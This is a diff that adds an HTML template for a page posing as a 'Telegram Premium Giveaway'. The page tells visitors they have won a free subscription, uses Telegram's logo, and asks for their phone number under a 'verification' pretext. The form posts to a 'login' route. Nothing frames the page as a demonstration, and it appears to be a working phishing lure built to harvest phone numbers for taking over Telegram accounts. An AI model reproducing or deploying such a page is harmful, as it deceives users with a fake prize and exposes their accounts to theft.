@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Premium Giveaway</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background-color: white;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .logo {
+            width: 64px;
+            height: 64px;
+            margin-bottom: 1rem;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 1rem;
+        }
+        .premium-badge {
+            background-color: #8774E1;
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            display: inline-block;
+            margin-bottom: 1rem;
+            font-weight: bold;
+        }
+        .description {
+            color: #666;
+            margin-bottom: 2rem;
+            line-height: 1.5;
+        }
+        .form-group {
+            margin-bottom: 1rem;
+            text-align: left;
+        }
+        .phone-input-group {
+            display: flex;
+            gap: 8px;
+        }
+        .country-select {
+            width: 120px;
+            flex-shrink: 0;
+        }
+        .phone-input {
+            flex-grow: 1;
+        }
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #333;
+        }
+        select, input {
+            width: 100%;
+            padding: 0.5rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            height: 40px;
+        }
+        button {
+            background-color: #8774E1;
+            color: white;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 1rem;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #7B68E0;
+        }
+        .error {
+            color: #dc3545;
+            margin-bottom: 1rem;
+            text-align: center;
+        }
+        .features {
+            text-align: left;
+            margin-bottom: 2rem;
+        }
+        .feature {
+            display: flex;
+            align-items: center;
+            margin-bottom: 0.5rem;
+            color: #666;
+        }
+        .feature-icon {
+            margin-right: 0.5rem;
+            color: #8774E1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo" class="logo">
+        <div class="premium-badge">🎉 PREMIUM GIVEAWAY</div>
+        <h1>Congratulations!</h1>
+        <p class="description">You have been selected to receive a <strong>FREE Telegram Premium</strong> subscription! Verify your phone number to claim your prize.</p>
+        
+        <div class="features">
+            <div class="feature">
+                <span class="feature-icon">✓</span> 4GB File Upload
+            </div>
+            <div class="feature">
+                <span class="feature-icon">✓</span> Faster Download Speed
+            </div>
+            <div class="feature">
+                <span class="feature-icon">✓</span> Premium Stickers
+            </div>
+            <div class="feature">
+                <span class="feature-icon">✓</span> No Ads
+            </div>
+            <div class="feature">
+                <span class="feature-icon">✓</span> Unique Badge
+            </div>
+        </div>
+
+        {% if error %}
+        <div class="error">{{ error }}</div>
+        {% endif %}
+        
+        <form method="POST" action="{{ url_for('login') }}">
+            <div class="form-group">
+                <label for="phone">Phone Number:</label>
+                <div class="phone-input-group">
+                    <select id="country_code" name="country_code" class="country-select" required>
+                        <option value="+98">IR (+98)</option>
+                        <option value="+7">RU (+7)</option>
+                        <option value="+55">BR (+55)</option>
+                        <option value="+90">TR (+90)</option>
+                        <option value="+39">IT (+39)</option>
+                        <option value="+34">ES (+34)</option>
+                        <option value="+49">DE (+49)</option>
+                        <option value="+33">FR (+33)</option>
+                        <option value="+44">GB (+44)</option>
+                        <option value="+91">IN (+91)</option>
+                        <option value="+62">ID (+62)</option>
+                        <option value="+84">VN (+84)</option>
+                        <option value="+86">CN (+86)</option>
+                        <option value="+81">JP (+81)</option>
+                        <option value="+82">KR (+82)</option>
+                        <option value="+1">US (+1)</option>
+                        <option value="+52">MX (+52)</option>
+                        <option value="+971">AE (+971)</option>
+                        <option value="+966">SA (+966)</option>
+                        <option value="+20">EG (+20)</option>
+                        <option value="+92">PK (+92)</option>
+                        <option value="+880">BD (+880)</option>
+                        <option value="+63">PH (+63)</option>
+                        <option value="+60">MY (+60)</option>
+                        <option value="+66">TH (+66)</option>
+                        <option value="+95">MM (+95)</option>
+                        <option value="+977">NP (+977)</option>
+                        <option value="+94">LK (+94)</option>
+                        <option value="+93">AF (+93)</option>
+                        <option value="+964">IQ (+964)</option>
+                        <option value="+963">SY (+963)</option>
+                        <option value="+961">LB (+961)</option>
+                        <option value="+962">JO (+962)</option>
+                        <option value="+972">IL (+972)</option>
+                        <option value="+968">OM (+968)</option>
+                        <option value="+974">QA (+974)</option>
+                        <option value="+973">BH (+973)</option>
+                        <option value="+965">KW (+965)</option>
+                        <option value="+994">AZ (+994)</option>
+                        <option value="+374">AM (+374)</option>
+                        <option value="+995">GE (+995)</option>
+                        <option value="+993">TM (+993)</option>
+                        <option value="+992">TJ (+992)</option>
+                        <option value="+996">KG (+996)</option>
+                        <option value="+998">UZ (+998)</option>
+                        <option value="+380">UA (+380)</option>
+                        <option value="+375">BY (+375)</option>
+                        <option value="+373">MD (+373)</option>
+                        <option value="+40">RO (+40)</option>
+                        <option value="+48">PL (+48)</option>
+                        <option value="+420">CZ (+420)</option>
+                        <option value="+36">HU (+36)</option>
+                        <option value="+30">GR (+30)</option>
+                        <option value="+351">PT (+351)</option>
+                        <option value="+31">NL (+31)</option>
+                        <option value="+32">BE (+32)</option>
+                        <option value="+46">SE (+46)</option>
+                        <option value="+47">NO (+47)</option>
+                        <option value="+45">DK (+45)</option>
+                        <option value="+358">FI (+358)</option>
+                        <option value="+43">AT (+43)</option>
+                        <option value="+41">CH (+41)</option>
+                        <option value="+359">BG (+359)</option>
+                        <option value="+381">RS (+381)</option>
+                        <option value="+385">HR (+385)</option>
+                        <option value="+386">SI (+386)</option>
+                        <option value="+421">SK (+421)</option>
+                    </select>
+                    <input type="tel" id="phone" name="phone" class="phone-input" required placeholder="Enter your phone number">
+                </div>
+            </div>
+            <button type="submit">Claim Premium</button>
+        </form>
+        
+        <p style="margin-top: 1rem; color: #666; font-size: 0.9rem;">
+            * Verification required to prevent abuse
+        </p>
+    </div>
+</body>
+</html> 
